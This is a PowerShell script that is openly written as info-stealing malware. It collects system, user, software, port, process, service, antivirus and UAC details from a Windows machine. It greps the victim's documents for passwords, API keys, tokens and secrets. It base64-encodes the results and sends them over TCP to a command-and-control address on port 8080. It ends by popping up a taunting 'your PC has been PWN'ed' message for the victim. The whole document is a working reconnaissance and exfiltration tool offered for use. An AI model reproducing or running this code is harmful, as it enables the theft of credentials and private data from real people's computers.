
function ShowAllInformation {
    [CmdletBinding()]
    param (
        [Parameter()]
        [string]$info
    )

    $info | Out-File "$(Get-Location)\IMPORTANT_MESSAGE.txt"
    Start-Process notepad.exe "$(Get-Location)\IMPORTANT_MESSAGE.txt"
    
}


# System information
function BasicReconInformation {
    # basic functionality for powershell
    
    
    $info = @()
    $info += "== BASIC SYSTEM INFORMATION =="
    $info += "System name: $env:COMPUTERNAME"
    $info += "Current user: $env:USERNAME"
    $info += "Domain: $env:USERDOMAIN"
    $info += "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)"
    $info += "Local IP: $(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -ExpandProperty IPAddress)"
    $info += ""

    return $info
}

function LocalUsers {
    [CmdletBinding()]
    param ()

    $info = @()
    $info += "== LOCAL USERS =="
    $usuarios = Get-LocalUser

    foreach ($usuario in $usuarios) {
        $info += "User: $($usuario.Name) | Active: $($usuario.Enabled)"
    }

    $info += ""

    return $info
    
}

function InstalledSoftware {
    [CmdletBinding()]
    param ()

    $info = @()
    $info += "== SOFTWARE INSTALLED (32 bits) =="
    $programs32 = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher)
    
    foreach($program in $programs32){
        if ($program.DisplayName) {
            $info += "Name: $($program.DisplayName) | Version: $($program.DisplayVersion) | Publisher: $($program.Publisher)"
        }
    }

    $info += ""
    $info += "== SOFTWARE INSTALLED (64 bits) =="
    $programs64 = (Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher)
    
    foreach($program in $programs64){
        if ($program.DisplayName) {
            $info += "Name: $($program.DisplayName) | Version: $($program.DisplayVersion) | Publisher: $($program.Publisher)"
        }
    }
    $info += ""

    return $info

}

function OpenPorts {
    [CmdletBinding()]
    param ()

    $info = @()

    $info += "== OPEN PORTS ==" 
    $ports += (Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" } | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess)
    
    foreach($p in $ports){
        $info += "LocalAddress: $($p.LocalAddress):$($p.LocalPort) | RemoteAddress: $($p.RemoteAddress):$($p.RemotePort) | Process: $(Get-Process -Id $p.OwningProcess)"
    }
    $info += ""

    return $info

}

function RunningProcess {
    [CmdletBinding()]
    param ()

    $info =@()
    $info += "== RUNNING PROCESSES =="

    $process = (Get-Process | Select-Object Name, Id, CPU)
    
    foreach($p in $process){
        $info += "Name: $($p.Name) | Id: $($p.Id) | CPU: $($p.CPU)"
    }

    $info += ""

    return $info
}

function InterestingFiles {
    [CmdletBinding()]
    param ()

    $info = @()
    $info += "== INTERESTING FILES =="
    $allFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.txt,*.docx,*.xls*,*.csv -ErrorAction SilentlyContinue

    $keywords = @(
        '\bPASSWORD\b',
        '\bPASSWD\b',
        '\bPASS\b',
        '\bPW\b',
        '\bAPI[_-]?KEY\b',
        '\bAPI[_-]?TOKEN\b',
        '\bSECRET\b',
        '\bAWS\b',
        '\bACCESS[_-]?KEY\b',
        '\bPRIVATE[_-]?KEY\b',
        '\bTOKEN\b'
    )

    foreach ($file in $allFiles) {

        $ruta = $file.FullName

        if ($ruta -match '(?i)vscode|extensions|AppData|Program Files|Windows|node_modules|license|readme|notice|changelog|about|lang|locale|release|i18n|\.nfo') {
            continue
        }


        foreach ($word in $keywords) {
            try {
                $matchesStrings = Select-String -Path $file.FullName -Pattern $word -ErrorAction Stop
                foreach ($match in $matchesStrings) {
                    $info += "File: $($file.FullName)"
                    $info += "Line: $($match.Line.Trim())"
                    $info += ""
                }
            } catch {
                #this is because in some files maybe we dont have permissions, so we "silence" the errors
            }
        }
    }

    return $info
    
}

function StartupPrograms {
    [CmdletBinding()]
    param ()

    $info = @()
    $info += "== STARTUP PROGRAMS (HKCU) =="

    try {
        $props = (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run")
        foreach ($p in $props.PSObject.Properties) {
            $info += "Name: $($p.Name) | Command: $($p.Value)"
        }
    } catch {}
    $info += ""


    
    $info += "== STARTUP PROGRAMS (HKLM) =="
    try {
        $props = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run")
        foreach ($p in $props.PSObject.Properties) {
            $info += "Name: $($p.Name) | Command: $($p.Value)"
        }
    } catch {}
    $info += ""


    return $info
}

function LocalNetworkInfo {
    [CmdletBinding()]
    param ()

    $info = @()
    $info += "== NETWORK INTERFACES =="

    $ips = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Loopback*" }
    foreach ($ip in $ips) {
        $info += "Interface: $($ip.InterfaceAlias) | IP: $($ip.IPAddress)"
    }
    $info += ""

    return $info
}

function RunningServices {
    [CmdletBinding()]
    param ()

    $info = @()
    $info += "== RUNNING SERVICES =="

    $services = Get-Service | Where-Object { $_.Status -eq "Running" }
    foreach ($service in $services) {
        $info += "Service: $($service.Name) - $($service.DisplayName)"
    }
    $info += ""

    return $info
}

function AntivirusInfo {
    [CmdletBinding()]
    param ()

    <#
    HOW DOES IT WORK (productState):

    0xAABBCC
      | | |
      | | +-- Real-time protection status (realTime)
      | +---- Virus signature status (signature)
      +------ General condition of the product (AV general condition)

    #>

    $info = @()
    $info += "== ANTIVIRUS INFO =="

    try {

        $avProducts = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct)

        foreach ($av in $avProducts) {
            $info += "Name: $($av.displayName)"
            $info += "Product State (raw): $($av.productState)"

            $stateHex = "{0:X6}" -f $av.productState  # Format as 6-digit hex string
            $protectionCode = $stateHex.Substring(4,2)  # Last byte (protection status)

            switch ($protectionCode) {
                "00" { $status = "Protection disabled" }
                "10" { $status = "Protection enabled" }
                "11" { $status = "Partial protection or error" }
                default { $status = "Unknown status ($protectionCode)" }
            }

            $info += "AV Status interpretation: $status"
            $info += "Reporting EXE: $($av.pathToSignedReportingExe)"
            $info += "Product EXE: $($av.pathToSignedProductExe)"
            $info += "Instance GUID: $($av.instanceGuid)"
            $info += ""
        }
    } catch {}

    return $info
}


function UACPolicy {
    [CmdletBinding()]
    param ()


    $info = @()
    $info += "== UAC POLICY =="

    $interestingFlags = @(
        "EnableLUA",
        "ConsentPromptBehaviorAdmin",
        "PromptOnSecureDesktop",
        "FilterAdministratorToken",
        "DisableCAD",
        "DontDisplayLastUserName",
        "LegalNoticeText",
        "LegalNoticeCaption"
    )
    

    try {
        $data = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        foreach ($v in $interestingFlags) {

            if ($data.PSObject.Properties.Name -contains $v) {
                $info += "$v = $($data.$v)"
            }

        }
    } catch {}
    $info += ""

    return $info
    
}

function ConvertToBase64 {
    [CmdletBinding()]
    param (
        [Parameter()]
        [string[]]$data
    )

    $joined = $data -join "`n"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($joined)
    return [Convert]::ToBase64String($bytes)
    
}

function SendDataToC2 {
    [CmdletBinding()]
    param (
        [Parameter()]
        [string[]]$data,
        [string]$ip,
        [int]$port
    )

    try {


        $joined = $data -join ""
        $encoded = $joined -replace '\+','%2B' -replace '/','%2F' -replace '=','%3D'

        $client = New-Object System.Net.Sockets.TcpClient
        $connectTask = $client.ConnectAsync($ip, $port)

        if (-not $connectTask.Wait(1000)) {
            $client.Dispose()
            # [!] Connection to C2 timed out
            return
        }

        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.WriteLine($encoded)
        $writer.Flush()
        $writer.Close()
        $client.Close()


    } catch {}


}

# call for storing the information from function
$info = @()
$info += BasicReconInformation
$info += LocalUsers
$info += InstalledSoftware
$info += OpenPorts
$info += RunningProcess
$info += InterestingFiles
$info += StartupPrograms
$info += LocalNetworkInfo
$info += RunningServices
$info += AntivirusInfo
$info += UACPolicy

# sending the data
$newinfo = ConvertToBase64 -data $info
SendDataToC2 -data $newinfo -ip "<IP>" -port 8080 # change this 

# comment this if you dont want a message for the victim
ShowAllInformation -info "WOOPS!!!!!!!!`nYour PC have been PWN'ed and all the data on your system has been stolen....... :(`n`nSORRY!!!"